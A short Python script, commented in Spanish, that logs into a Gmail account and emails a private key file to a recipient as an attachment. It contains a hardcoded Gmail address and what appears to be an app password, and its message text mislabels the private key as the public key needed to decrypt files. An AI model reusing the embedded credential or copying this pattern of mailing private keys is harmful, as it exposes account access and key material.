import smtplib
from email.message import EmailMessage
import time
from cryptography.hazmat.primitives import serialization

# Configuración del correo
EMAIL_USER = 'tccsmtp12@gmail.com'
EMAIL_PASS = 'vhjz ayqn jirl eqvr'
SMTP_SERVER = 'smtp.gmail.com'
SMTP_PORT = 587

def send_private_key_email(recipient_email, private_key_path):
    msg = EmailMessage()
    msg['Subject'] = 'Clave Pública para Desencriptación'
    msg['From'] = EMAIL_USER
    msg['To'] = recipient_email
    msg.set_content("Adjunto encontrará la clave pública necesaria para desencriptar los archivos.")

    # Adjuntar la clave privada
    with open(private_key_path, 'rb') as f:
        msg.add_attachment(f.read(), maintype='application', subtype='octet-stream', filename='private_key.pem')

    # Enviar el correo
    try:
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as smtp:
            smtp.starttls()  # Activar TLS
            smtp.login(EMAIL_USER, EMAIL_PASS)
            time.sleep(2)  # Espera de 2 segundos antes de enviar
            smtp.send_message(msg)
        print("Correo enviado exitosamente con la clave privada.")
    except smtplib.SMTPException as e:
        print(f"Error al enviar el correo: {e}")